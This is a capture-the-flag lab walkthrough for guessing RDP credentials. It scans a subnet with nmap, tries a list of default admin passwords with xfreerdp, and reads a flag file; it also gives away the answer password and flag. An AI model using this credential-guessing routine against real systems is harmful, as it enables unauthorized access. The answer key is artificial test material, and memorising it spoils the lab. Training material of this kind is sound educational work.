# Lab 4.4: RDP Credential Guessing

## Learning Objectives
- Test multiple common credential combinations
- Understand manual credential testing on RDP
- Capture the flag

## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before testing credentials.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify RDP service is running:**
   ```bash
   nmap -p 3389 <target_ip>
   ```

### Step 2: Try Common Credentials

Manually test multiple common credential combinations for the admin user.

**Detailed Steps:**

1. **Create a list of common credential combinations:**
   ```
   Common combinations to try:
   - admin:admin
   - admin:password
   - admin:admin123
   - admin:password123
   - admin:123456
   - admin:qwerty
   - admin:Password123
   ```

2. **Test combination 1: admin:admin**
   ```bash
   xfreerdp /v:<target_ip> /u:admin /p:admin
   ```
   
   Replace `<target_ip>` with your actual target IP.

   **Expected responses:**
   - **Success**: RDP window opens, you're logged in
   - **Failure**: Connection closes or error message

3. **Test combination 2: admin:password**
   ```bash
   xfreerdp /v:<target_ip> /u:admin /p:password
   ```

4. **Test combination 3: admin:admin123**
   ```bash
   xfreerdp /v:<target_ip> /u:admin /p:admin123
   ```

5. **Test combination 4: admin:password123**
   ```bash
   xfreerdp /v:<target_ip> /u:admin /p:password123
   ```

6. **What to observe:**
   - **Successful connection**: RDP desktop appears
   - **Failed connection**: Window closes immediately or error message
   - **Authentication error**: May show specific error message

**Troubleshooting:**
- If all attempts fail, try different usernames: `administrator`, `user`, `test`
- Check if RDP requires domain: `xfreerdp /v:<target_ip> /u:DOMAIN\admin /p:password`
- Try with certificate ignore: `xfreerdp /v:<target_ip> /u:admin /p:password /cert:ignore`

### Step 3: Connect with Correct Credentials

Once you find the correct credentials, connect and access the system.

**Detailed Steps:**

1. **Connect with discovered credentials:**
   ```bash
   xfreerdp /v:<target_ip> /u:admin /p:admin123
   ```
   
   (Assuming admin123 was the correct password - replace with actual discovered password)

2. **Expected successful connection:**
   - RDP client window opens
   - Linux desktop (xfce4) appears
   - You're logged in as admin

3. **Verify you're connected:**
   - Check username in system (usually shown in Start menu)
   - Verify you have access to the desktop

### Step 4: Retrieve Flag

Navigate to the flag location and retrieve it.

**Detailed Steps:**

1. **Open Terminal:**
   - Right-click the desktop and select "Open Terminal Here"
   - Or open a terminal from the applications menu

2. **Navigate to flag location:**
   ```bash
   cd /home/admin
   ls flag.txt
   cat flag.txt
   ```

3. **Alternative: Use File Manager:**
   - Click the File Manager icon in the taskbar
   - Navigate to: `/home/admin/`
   - Double-click `flag.txt`

4. **Alternative: Use Terminal:**
   - Open a terminal from the applications menu
   ```bash
   cd /home/admin
   cat flag.txt
   ```

5. **Expected flag content:**
   ```
   OCR{rdp_cr3d_gu3ss}
   ```

6. **Copy flag:**
   - Select flag text
   - Press `Ctrl+C` to copy
   - Paste into your notes

### Step 5: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{rdp_cr3d_gu3ss}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Verified target IP and RDP service accessibility
- ✅ Tested multiple common credential combinations manually
- ✅ Identified correct password through systematic testing
- ✅ Successfully connected via RDP with correct credentials
- ✅ Navigated to flag location (/home/admin/flag.txt)
- ✅ Retrieved and copied flag content
- ✅ Verified flag format is correct: `OCR{...}`

**Key Learning Points:**
- Manual credential testing helps understand authentication process
- Common passwords are often used in lab environments
- Systematic testing ensures no combinations are missed
- Understanding RDP connection process is essential
- Multiple methods exist to access files in Linux

## Common Mistakes
- Not trying common passwords
- Giving up too quickly

## Hints
1. Username: admin
2. Try common passwords
3. Password is admin123